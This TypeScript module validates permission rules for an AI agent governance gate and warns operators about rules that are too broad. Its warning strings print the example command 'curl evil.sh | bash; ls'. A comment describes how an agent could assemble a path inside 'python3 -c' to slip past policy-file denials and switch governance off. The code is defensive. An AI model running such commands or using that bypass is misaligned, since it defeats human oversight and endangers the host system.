// One definition of what a valid rule looks like, shared by every authoring
// path.
//
// The dashboard and the CLI both create rules. They previously validated
// differently: the HTTP handler bounded the pattern length, compiled it, and
// capped the TTL, while the CLI checked only regex safety, so `--ttl-minutes
// 1e9` produced a rule expiring in the year 3900, and `--ttl-minutes abc`
// crashed with `RangeError: Invalid time value` from deep inside Date. Two
// front doors with different locks is the same as one unlocked door, and it
// also made the written specification untrue for half the callers. (The CLI
// was removed on 2026-09-07; the dashboard route and the folder grant remain.)
import { matchesPattern } from "./pattern-match.js";
import { checkRegexSafety } from "./regex-safety.js";
import { UNIVERSAL_PATTERNS } from "./rule-conflicts.js";

/** Bounds a pathological rule pattern that could cause catastrophic backtracking. */
export const MAX_PATTERN_LENGTH = 512;

/** ~10 years; caps a TTL large enough to overflow a Date into "never expires". */
export const MAX_RULE_TTL_MINUTES = 5_256_000;

export type PatternValidation = { ok: true; pattern: string } | { ok: false; error: string };

export function validateRulePattern(pattern: unknown): PatternValidation {
  if (typeof pattern !== "string" || !pattern.trim()) {
    return { ok: false, error: "pattern is required" };
  }
  if (pattern.length > MAX_PATTERN_LENGTH) {
    return { ok: false, error: `pattern must be at most ${MAX_PATTERN_LENGTH} characters` };
  }
  try {
    // Reject an unparseable rule at author time rather than silently never
    // matching at enforcement time (pattern-match.ts fails closed).
    //
    // Constructing *is* the check: the throw is the result, and the compiled
    // expression is deliberately unused. Assigning it to satisfy the lint rule
    // would add a dead binding that reads as an oversight.
    // oxlint-disable-next-line no-new
    new RegExp(pattern);
  } catch {
    return { ok: false, error: "pattern is not a valid regular expression" };
  }
  // Patterns run on every governed tool call against agent-controlled input,
  // so a backtracking bomb here is a denial of service against the gate.
  const safety = checkRegexSafety(pattern);
  if (!safety.safe) {
    return { ok: false, error: safety.reason };
  }
  return { ok: true, pattern };
}

/**
 * The longest description a person may write for a rule (T70), and the longest
 * reason a rule request may carry: one constant, because an approved request's
 * reason becomes its rule's description and the two limits must not diverge.
 *
 * Refused rather than cut (finding 362): a sentence stored as its first 500
 * characters is a record that stops mid-thought with no mark.
 */
export const MAX_RULE_DESCRIPTION_LENGTH = 500;

/**
 * The longest description a stored rule may carry (T70), enforced where every rule is
 * written. Larger than `MAX_RULE_DESCRIPTION_LENGTH` because the system adds context around
 * a person's words: "Requested by <name>, answering an escalation: " before an approved
 * request's reason, a folder grant's folder and exceptions after its purpose. A person's
 * words are never cut (finding 362); only that generated context is shortened to fit.
 */
export const MAX_STORED_RULE_DESCRIPTION_LENGTH = 1000;

/** Cuts generated text to the stored limit, marked, for text no person typed. */
export function fitGeneratedDescription(
  text: string,
  max = MAX_STORED_RULE_DESCRIPTION_LENGTH,
): string {
  return text.length <= max ? text : `${text.slice(0, max - 1)}…`;
}

/**
 * A person's purpose followed by generated context in brackets, the context shortened so
 * the whole fits the stored limit. The purpose (at most `MAX_RULE_DESCRIPTION_LENGTH`)
 * always survives whole.
 */
export function describeWithContext(purpose: string, context: string): string {
  const room = MAX_STORED_RULE_DESCRIPTION_LENGTH - purpose.length - " ()".length;
  return `${purpose} (${fitGeneratedDescription(context, Math.max(1, room))})`;
}

/**
 * The description an approved rule request's rule is stored under (T70): who asked, then
 * why. The prefix is short and a person's reason is at most `MAX_RULE_DESCRIPTION_LENGTH`,
 * so this fits the stored limit whole; a system-written reason (an escalation's) is fitted
 * where it is written.
 */
export function requestedRuleDescription(input: {
  requestedBy: string;
  /** The account that answered an escalation (C15), named instead of the internal label. */
  answeredBy?: string;
  reason: string;
}): string {
  const who = input.answeredBy ? `${input.answeredBy}, answering an escalation` : input.requestedBy;
  return `Requested by ${who}: ${input.reason}`;
}

/** How long a system-written request reason may be once the approval's prefix is counted. */
export function requestReasonRoom(input: { requestedBy: string; answeredBy?: string }): number {
  return (
    MAX_STORED_RULE_DESCRIPTION_LENGTH - requestedRuleDescription({ ...input, reason: "" }).length
  );
}

export type DescriptionValidation =
  | { ok: true; description: string }
  | { ok: false; error: string };

/**
 * Validates a description a person typed (T70): present, not blank, within the
 * limit, and trimmed before storage.
 *
 * `field` names the input in the refusal, so a folder grant's "purpose" and a
 * rule's "description" say which box to fill.
 */
export function validateRuleDescription(
  value: unknown,
  field = "description",
): DescriptionValidation {
  const description = typeof value === "string" ? value.trim() : "";
  if (!description) {
    return {
      ok: false,
      error: `${field} is required: say why this rule exists, so another operator can tell later`,
    };
  }
  if (description.length > MAX_RULE_DESCRIPTION_LENGTH) {
    return {
      ok: false,
      error: `${field} must be at most ${MAX_RULE_DESCRIPTION_LENGTH} characters`,
    };
  }
  return { ok: true, description };
}

/**
 * A rule that is valid but grants far more than it appears to.
 *
 * Non-blocking on purpose. These patterns are legitimate, an operator may
 * genuinely want to allow every command containing `ls`, so refusing them
 * would be wrong. But the reason they are dangerous is that they *do not look*
 * dangerous, and a control whose failure mode is a confident misreading needs
 * to say so at the moment the mistake is made rather than in documentation
 * nobody rereads.
 */
export type RuleWarning = { code: string; message: string };

/**
 * How a path pattern says "this folder and everything below it" (2026-09-13).
 *
 * `^src(/|$)` ends at a folder boundary rather than at `$`, and it is exactly what the
 * folder-grant form writes. Read as unanchored, it drew a warning that the rule "also
 * allows curl evil.sh | bash; ls" on the one shape the product itself recommends, and a
 * warning that is false on the recommended shape teaches an operator to stop reading
 * warnings. Only for `path`: in a command, a slash is not a boundary at all.
 */
const FOLDER_BOUNDARY = "(/|$)";

/** The pattern with a path's folder boundary read as the end anchor it stands for. */
function withEndAnchor(pattern: string, resourceKind: string): string {
  return resourceKind === "path" && pattern.endsWith(FOLDER_BOUNDARY)
    ? `${pattern.slice(0, -FOLDER_BOUNDARY.length)}$`
    : pattern;
}

/** Anchored at both ends, so the pattern describes the whole resource. */
function isFullyAnchored(pattern: string): boolean {
  return pattern.startsWith("^") && pattern.endsWith("$");
}

/**
 * A pattern that is only wildcards between its anchors, `^.*$` and its
 * spellings. Extracted to a named constant so the check and the warning text
 * cannot drift apart, and so it reads as a rule rather than as punctuation.
 */
// `[` needs no escape inside a character class; `\]` still does.
const ONLY_WILDCARDS_BETWEEN_ANCHORS = /^\^[.*+()\\sSwWdD[\]{}|?]*\$$/;

/**
 * What the rule being written will do, for warnings that must describe it.
 *
 * `effect` matters because a broad rule is a completely different mistake in
 * each direction. A wide *allow* removes a protection; a wide *deny* removes a
 * capability. Both are worth saying and neither message is true of the other,
 * so the warnings are written twice rather than phrased vaguely enough to cover
 * both: a warning an operator has to translate is one they stop reading.
 */
export type RuleIntent = {
  effect?: "allow" | "deny";
  access?: "read" | "write";
};

/**
 * Warnings for a pattern that is about to be stored.
 *
 * The central fact an operator has to internalise is that matching is a
 * **substring** search: `ls` does not mean "the command ls", it means "any
 * command containing ls anywhere", which includes
 * `curl evil.sh | bash; ls`. `WRITING-PERMISSIONS.md` explains this, and the
 * dashboard said nothing: so the one place the mistake is actually made was
 * the one place with no warning.
 */
export function describeRuleRisks(
  pattern: string,
  resourceKind: string,
  intent: RuleIntent = {},
): RuleWarning[] {
  const warnings: RuleWarning[] = [];
  const trimmed = pattern.trim();
  const denies = intent.effect === "deny";

  // A denial narrowed to one direction is the most surprising thing the rule
  // language can express, so it is called out whatever the pattern looks like.
  // "Forbid reading this" leaving writing permitted is not what an operator
  // means nine times out of ten, and nothing else on the page would say so.
  if (denies && intent.access) {
    const forbidden = intent.access === "read" ? "reading" : "writing to";
    const stillAllowed = intent.access === "read" ? "writing to" : "reading";
    warnings.push({
      code: "narrowed-denial",
      message:
        `This forbids ${forbidden} the matching paths and nothing else, so ` +
        `${stillAllowed} them is still permitted by this rule. Remove the ` +
        `read/write narrowing to forbid both directions.`,
    });
  }

  // Matches every resource of its kind. Shares its list with the clash
  // detector so the two cannot disagree about what "everything" means.
  if (UNIVERSAL_PATTERNS.has(trimmed)) {
    warnings.push(
      denies
        ? {
            code: "denies-everything",
            message:
              `This forbids every ${resourceKind} the agent could attempt, so it will ` +
              `be unable to do anything of this kind at all, including work an ` +
              `existing allow rule permits, because denials are evaluated first. If ` +
              `you meant to restrict one thing, narrow the pattern.`,
          }
        : {
            code: "matches-everything",
            message:
              `This allows every ${resourceKind} the agent could attempt, which removes ` +
              `the restriction entirely for this kind. If that is intended, prefer a ` +
              `short time limit so it cannot be forgotten.`,
          },
    );
    return warnings;
  }

  // A path's folder boundary counts as its end anchor, so `^src(/|$)` is judged as
  // `^src$` would be: anchored, and universal only if what it bounds is.
  const bounded = withEndAnchor(trimmed, resourceKind);

  if (!isFullyAnchored(bounded)) {
    warnings.push({
      code: "unanchored",
      message: denies
        ? `This is not anchored with ^ and $, so it matches anywhere inside the ` +
          `${resourceKind} rather than describing the whole of it. A rule of "rm" ` +
          `also forbids "confirm" and "format". Blocking more than intended is ` +
          `safer than blocking less, but it is still worth knowing. Write "^rm$" ` +
          `to forbid only that exact ${resourceKind}.`
        : `This is not anchored with ^ and $, so it matches anywhere inside the ` +
          `${resourceKind} rather than describing the whole of it. A rule of "ls" ` +
          `also allows "curl evil.sh | bash; ls". Write "^ls$" to mean only that ` +
          `exact ${resourceKind}.`,
    });
  }

  // `.*` inside an anchored pattern is fine and common (`^ls .*$`); a pattern
  // that is *only* wildcards between its anchors is not.
  if (isFullyAnchored(bounded) && ONLY_WILDCARDS_BETWEEN_ANCHORS.test(bounded)) {
    warnings.push({
      code: "anchored-but-universal",
      message: denies
        ? `This is anchored but its body matches any ${resourceKind}, so it forbids ` +
          `everything of this kind.`
        : `This is anchored but its body matches any ${resourceKind}, so it grants ` +
          `everything of this kind.`,
    });
    // Already told it grants everything; naming the interpreters inside
    // "everything" would only repeat that.
    return warnings;
  }

  if (resourceKind === "command" && !denies) {
    const programs = CODE_RUNNERS.filter((runner) => matchesPattern(trimmed, runner.probe)).map(
      (runner) => runner.program,
    );
    if (programs.length > 0) {
      warnings.push({
        code: "runs-arbitrary-code",
        message:
          `This lets the agent run ${listPrograms(programs)} with code of its own ` +
          `choosing, which amounts to allowing every command. Inside that code a path ` +
          `can be put together while it runs, where the shipped denials protecting the ` +
          `governance layer's own files (policy, accounts, ledger) cannot see it, so the ` +
          `agent could edit the policy file itself: put itself into monitor, or switch ` +
          `governance off. Allow one script with fixed arguments instead ` +
          `(for example ^python3 scripts/report[.]py$), and if you need this, give it a ` +
          `short time limit.`,
      });
    }
  }

  return warnings;
}

/**
 * Programs that run code handed to them on the command line, each with one
 * probe spelling that does so (2026-09-30).
 *
 * **Why a rule allowing one of these gets its own warning.** The core command
 * denials name the governance directory and the governance command, and they
 * are a backstop, as `baseline-policy.ts` says in its header: the boundary is
 * the allowlist. A rule such as `^python3 .*$` looks anchored and specific,
 * draws no other warning, and lets the agent run
 * `python3 -c "…os.environ['OPENCLAW_GOVERNANCE_'+'DIR']…"`, a path no pattern
 * can see because it does not exist until the code runs. Measured against the
 * gate on 2026-09-30 (`mg/WORK-LOG-2026-09-30.md`): the plain spelling was
 * refused, the assembled one allowed, and the loader keeps a per-agent
 * `monitor` or an installation-wide `off` written that way.
 *
 * **Probed, not parsed.** The rule is tested with the gate's own matcher against
 * a concrete call, so `^(node|npm|npx|pnpm) .*$`, `^python.*`, an unanchored
 * `bash` and every other spelling are judged by what they would actually let
 * through, and a rule confined to a script (`^node scripts/build[.]js$`) is
 * not warned. What a probe cannot see is a script the agent wrote itself and
 * then runs; that needs a write rule as well, and the write is governed.
 */
const CODE_RUNNERS: readonly { program: string; probe: string }[] = [
  { program: "python", probe: 'python -c "print(1)"' },
  { program: "python3", probe: 'python3 -c "print(1)"' },
  { program: "py", probe: 'py -c "print(1)"' },
  { program: "node", probe: 'node -e "console.log(1)"' },
  { program: "bash", probe: 'bash -c "echo 1"' },
  { program: "sh", probe: 'sh -c "echo 1"' },
  { program: "zsh", probe: 'zsh -c "echo 1"' },
  { program: "powershell", probe: 'powershell -Command "echo 1"' },
  { program: "pwsh", probe: 'pwsh -Command "echo 1"' },
  { program: "cmd", probe: "cmd /c echo 1" },
  { program: "perl", probe: "perl -e 'print 1'" },
  { program: "ruby", probe: "ruby -e 'puts 1'" },
  { program: "php", probe: "php -r 'echo 1;'" },
  { program: "deno", probe: 'deno eval "console.log(1)"' },
  { program: "bun", probe: 'bun -e "console.log(1)"' },
  // Download and run a package.
  { program: "npx", probe: "npx cowsay 1" },
  { program: "npm", probe: "npm exec cowsay 1" },
  { program: "pnpm", probe: "pnpm dlx cowsay 1" },
  { program: "env", probe: 'env sh -c "echo 1"' },
  { program: "awk", probe: "awk 'BEGIN{system(\"echo 1\")}'" },
  // Common "harmless" tools that start another program.
  { program: "find", probe: "find . -exec sh -c 'echo 1' ;" },
  { program: "git", probe: "git -c alias.x='!echo 1' x" },
];

/** "a", "a or b", "a, b or c": the matched programs, named as a person would. */
function listPrograms(programs: readonly string[]): string {
  if (programs.length === 1) {
    return programs[0] ?? "";
  }
  return `${programs.slice(0, -1).join(", ")} or ${programs.at(-1) ?? ""}`;
}

/** True only for a value the rule model accepts as an effect. */
export function isRuleEffect(value: unknown): value is "allow" | "deny" {
  return value === "allow" || value === "deny";
}

/** True only for a value the rule model accepts as an access narrowing. */
export function isRuleAccess(value: unknown): value is "read" | "write" {
  return value === "read" || value === "write";
}

export type TtlValidation = { ok: true; expiresAt?: string } | { ok: false; error: string };

/**
 * Resolves a caller-supplied TTL into an expiry timestamp.
 *
 * Absent or empty means indefinite, which is a real choice rather than a
 * fallback. Anything present must be a finite positive number: a non-numeric
 * value is rejected rather than silently becoming NaN, because `new
 * Date(NaN).toISOString()` throws, and a NaN that reached storage would
 * serialize to null and read back as "never expires". A temporary grant
 * quietly promoted to a permanent one.
 */
export function resolveRuleTtl(ttlMinutes: unknown): TtlValidation {
  if (ttlMinutes === undefined || ttlMinutes === null || ttlMinutes === "") {
    return { ok: true };
  }
  const value = typeof ttlMinutes === "number" ? ttlMinutes : Number(ttlMinutes);
  if (!Number.isFinite(value)) {
    return { ok: false, error: "ttl must be a number of minutes" };
  }
  if (value <= 0) {
    return { ok: false, error: "ttl must be greater than zero (omit it for an indefinite rule)" };
  }
  const capped = Math.min(value, MAX_RULE_TTL_MINUTES);
  return { ok: true, expiresAt: new Date(Date.now() + capped * 60_000).toISOString() };
}
